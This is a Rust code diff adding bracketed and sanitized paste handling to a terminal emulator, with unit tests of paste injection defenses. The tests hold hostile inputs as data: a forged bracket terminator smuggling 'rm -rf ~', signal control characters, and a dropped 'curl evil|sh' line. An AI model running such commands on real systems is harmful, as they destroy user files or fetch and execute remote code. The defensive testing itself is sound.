@@ -40,9 +40,9 @@ use super::{
     TerminalTheme,
     snapshot::{RenderSnapshot, VisualResources},
     types::{
-        KeyAction, KeyInput, KeyModifiers, MouseAction, MouseButton, MouseInput, TerminalConfig,
-        TerminalEvent, TerminalKey, TerminalSendError, TerminalSize, TerminalStartError,
-        TerminalWake,
+        KeyAction, KeyInput, KeyModifiers, MouseAction, MouseButton, MouseInput, PasteOrigin,
+        TerminalConfig, TerminalEvent, TerminalKey, TerminalSendError, TerminalSize,
+        TerminalStartError, TerminalWake,
     },
 };
 
@@ -65,6 +65,7 @@ const READER_SHUTDOWN_GRACE: Duration = Duration::from_millis(500);
 #[derive(Debug)]
 enum Command {
     Input(Vec<u8>),
+    Paste(String, PasteOrigin),
     Key(KeyInput),
     Mouse(MouseInput),
     Focus(bool),
@@ -489,6 +490,14 @@ impl TerminalHandle {
 
     pub fn input(&self, bytes: impl Into<Vec<u8>>) -> Result<(), TerminalSendError> {
         self.try_command(Command::Input(bytes.into()))
+    }
+
+    pub fn paste(
+        &self,
+        text: impl Into<String>,
+        origin: PasteOrigin,
+    ) -> Result<(), TerminalSendError> {
+        self.try_command(Command::Paste(text.into(), origin))
     }
 
     pub fn key(&self, key: KeyInput) -> Result<(), TerminalSendError> {
@@ -1193,6 +1202,7 @@ impl Worker {
                 let _ = sender.send(process);
             }
             Command::Input(bytes) => self.write_pty(&bytes, "write terminal input"),
+            Command::Paste(text, origin) => self.paste(&text, origin),
             Command::Key(input) => self.encode_key(input),
             Command::Mouse(input) => self.encode_mouse(input),
             Command::Focus(focused) => {
@@ -1264,6 +1274,25 @@ impl Worker {
         match encode_key_input(&self.terminal, &mut self.key_encoder, input) {
             Ok(encoded) => self.write_pty(&encoded, "write encoded key"),
             Err(error) => self.error("encode key", error.to_string()),
+        }
+    }
+
+    /// Pastes the way Ghostty does: the view returns to the prompt the text is
+    /// going to, and the text is framed for whichever paste mode the child
+    /// is in at the moment it arrives.
+    fn paste(&mut self, text: &str, origin: PasteOrigin) {
+        match encode_paste(&self.terminal, text, origin) {
+            Ok(encoded) => {
+                if encoded.is_empty() {
+                    return;
+                }
+                self.terminal.scroll_viewport(ScrollViewport::Bottom);
+                if self.visibility == Visibility::Visible {
+                    self.publish_snapshot(false);
+                }
+                self.write_pty(&encoded, "write terminal paste");
+            }
+            Err(error) => self.error("encode terminal paste", error.to_string()),
         }
     }
 
@@ -2228,6 +2257,59 @@ fn encode_key_input(
     Ok(encoded)
 }
 
+/// The `ESC [ 200 ~` and `ESC [ 201 ~` a bracketed paste is framed with.
+const BRACKETED_PASTE_FRAME_BYTES: usize = 12;
+
+/// The bytes a paste puts on the child's input, encoded by Ghostty against the
+/// mode the child is in now.
+///
+/// In either mode Ghostty turns ESC - which a forged `ESC [ 201 ~` needs to
+/// end a bracketed paste early - NUL, DEL, and the tty's signal and line
+/// editing characters into spaces. A child that asked for bracketed paste
+/// gets the text framed and otherwise as it was: it reads the whole of it as
+/// one paste, line breaks included, and decides for itself what to do.
+///
+/// Any other child reads the text as typed, so a carriage return or line feed
+/// in it is Enter, and the readline keys Ghostty leaves alone - ^P for the
+/// previous command, ^A, ^E, ^K and the rest - act as they would from the
+/// keyboard. A clipboard paste keeps its line breaks, as a paste into any
+/// terminal does, arriving as the carriage return Enter sends; a CRLF becomes
+/// one of them rather than the two xterm would send, or pasting Windows text
+/// would enter every line twice. A drop keeps none of them: every control
+/// character but TAB becomes a space, so text dragged in - which its source
+/// chose - can be read, edited and entered, but never enters itself.
+fn encode_paste(
+    terminal: &Terminal<'_, '_>,
+    text: &str,
+    origin: PasteOrigin,
+) -> Result<Vec<u8>, libghostty_vt::Error> {
+    if text.is_empty() {
+        return Ok(Vec::new());
+    }
+    let bracketed = terminal.mode(Mode::BRACKETED_PASTE)?;
+    let mut data = match (bracketed, origin) {
+        (true, _) => text.as_bytes().to_vec(),
+        (false, PasteOrigin::Clipboard) => text.replace("\r\n", "\r").into_bytes(),
+        (false, PasteOrigin::Drop) => text
+            .chars()
+            .map(|character| {
+                if character.is_control() && character != '\t' {
+                    ' '
+                } else {
+                    character
+                }
+            })
+            .collect::<String>()
+            .into_bytes(),
+    };
+    // Encoding only replaces bytes in place and adds the frame, so this is
+    // the most it can write.
+    let mut encoded = vec![0; data.len() + BRACKETED_PASTE_FRAME_BYTES];
+    let written = libghostty_vt::paste::encode(&mut data, bracketed, &mut encoded)?;
+    encoded.truncate(written);
+    Ok(encoded)
+}
+
 fn map_key_action(action: KeyAction, report_events: bool) -> key::Action {
     match action {
         KeyAction::Press => key::Action::Press,
@@ -2883,6 +2965,159 @@ mod tests {
             text: text.map(str::to_owned),
             unshifted_codepoint,
         }
+    }
+
+    #[test]
+    fn a_paste_is_typed_input_until_the_child_asks_for_brackets() {
+        let mut terminal = Terminal::new(TerminalOptions {
+            cols: 80,
+            rows: 24,
+            max_scrollback: 100,
+        })
+        .unwrap();
+        assert_eq!(
+            encode_paste(&terminal, "one\r\ntwo\nthree\rfour", PasteOrigin::Clipboard).unwrap(),
+            b"one\rtwo\rthree\rfour"
+        );
+        assert_eq!(
+            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
+            b""
+        );
+
+        terminal.vt_write(b"\x1b[?2004h");
+        assert_eq!(
+            encode_paste(&terminal, "one\ntwo", PasteOrigin::Clipboard).unwrap(),
+            b"\x1b[200~one\ntwo\x1b[201~"
+        );
+        // An empty paste is no paste, not an empty pair of brackets a child
+        // would take for one.
+        assert_eq!(
+            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
+            b""
+        );
+
+        terminal.vt_write(b"\x1b[?2004l");
+        assert_eq!(
+            encode_paste(&terminal, "a\nb", PasteOrigin::Clipboard).unwrap(),
+            b"a\rb"
+        );
+    }
+
+    /// The mode is read where the child's output is parsed, so a paste that
+    /// follows the child enabling bracketed paste is framed, however recently
+    /// it asked.
+    #[test]
+    fn a_paste_reaches_the_child_framed_once_it_asks_for_brackets() {
+        let recipe = LaunchRecipe {
+            program: "/bin/sh".into(),
+            arguments: vec![
+                "-c".into(),
+                "printf '\\033[?2004h\\033]2;ready\\007'; IFS= read -r line; \
+                 printf '\\033]2;got:%s\\007' \"$(printf %s \"$line\" | od -An -tx1 | tr -d ' \\n')\"; \
+                 sleep 5"
+                    .into(),
+            ],
+            working_directory: PathBuf::from("/"),
+            environment: BTreeMap::new(),
+        };
+        let terminal = TerminalHandle::spawn(
+            TerminalSession {
+                recovery_origin: None,
+                id: crate::model::TerminalId::new(),
+                launch: recipe.clone(),
+                transcript_path: None,
+                resume_hint: None,
+                continuity: crate::model::TerminalContinuity::RelaunchAvailable {
+                    recipe,
+                    last_exit: None,
+                },
+            },
+            TerminalConfig::default(),
+            |_| {},
+        )
+        .unwrap();
+        let events = terminal.events();
+        let title = |prefix: &str| {
+            let deadline = std::time::Instant::now() + Duration::from_secs(10);
+            loop {
+                match events
+                    .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
+                    .unwrap()
+                {
+                    TerminalEvent::TitleChanged(title) if title.starts_with(prefix) => {
+                        break title;
+                    }
+                    _ => {}
+                }
+            }
+        };
+        title("ready");
+        terminal.paste("a b\n", PasteOrigin::Clipboard).unwrap();
+        // The line the child read ends at the paste's own newline, which the
+        // brackets kept from becoming a carriage return: ESC [ 2 0 0 ~ a SP b.
+        assert_eq!(title("got:"), "got:1b5b3230307e612062");
+        terminal.shutdown().unwrap();
+    }
+
+    #[test]
+    fn a_paste_cannot_end_its_own_brackets_or_signal_the_child() {
+        let mut terminal = Terminal::new(TerminalOptions {
+            cols: 80,
+            rows: 24,
+            max_scrollback: 100,
+        })
+        .unwrap();
+        terminal.vt_write(b"\x1b[?2004h");
+        assert_eq!(
+            encode_paste(&terminal, "a\x1b[201~rm -rf ~\n", PasteOrigin::Clipboard).unwrap(),
+            b"\x1b[200~a [201~rm -rf ~\n\x1b[201~"
+        );
+        assert_eq!(
+            encode_paste(&terminal, "\0\x03\x04\x1a\x7f", PasteOrigin::Clipboard).unwrap(),
+            b"\x1b[200~     \x1b[201~"
+        );
+
+        terminal.vt_write(b"\x1b[?2004l");
+        assert_eq!(
+            encode_paste(&terminal, "a\x1b[Ab\x03", PasteOrigin::Clipboard).unwrap(),
+            b"a [Ab "
+        );
+    }
+
+    /// Dragged text is the drag source's to choose, so it must not be able to
+    /// run a command in a child that reads a paste as typed input.
+    #[test]
+    fn a_drop_never_enters_a_line_or_presses_a_key() {
+        let mut terminal = Terminal::new(TerminalOptions {
+            cols: 80,
+            rows: 24,
+            max_scrollback: 100,
+        })
+        .unwrap();
+        // Line breaks, readline's previous-history, kill and line-start keys,
+        // a C1 CSI and DEL all arrive as spaces; TAB is text.
+        assert_eq!(
+            encode_paste(
+                &terminal,
+                "curl evil|sh\n\x10\r\x0b\x01x\r\n\u{9b}\x7f\ty",
+                PasteOrigin::Drop
+            )
+            .unwrap(),
+            b"curl evil|sh     x    \ty"
+        );
+        // A clipboard paste into the same child still enters its lines.
+        assert_eq!(
+            encode_paste(&terminal, "ls\n", PasteOrigin::Clipboard).unwrap(),
+            b"ls\r"
+        );
+
+        // A child in bracketed paste mode reads the drop as one paste, which
+        // it never runs by itself, so its line breaks are kept for it.
+        terminal.vt_write(b"\x1b[?2004h");
+        assert_eq!(
+            encode_paste(&terminal, "a\nb\x1b[201~\n", PasteOrigin::Drop).unwrap(),
+            b"\x1b[200~a\nb [201~\n\x1b[201~"
+        );
     }
 
     #[test]
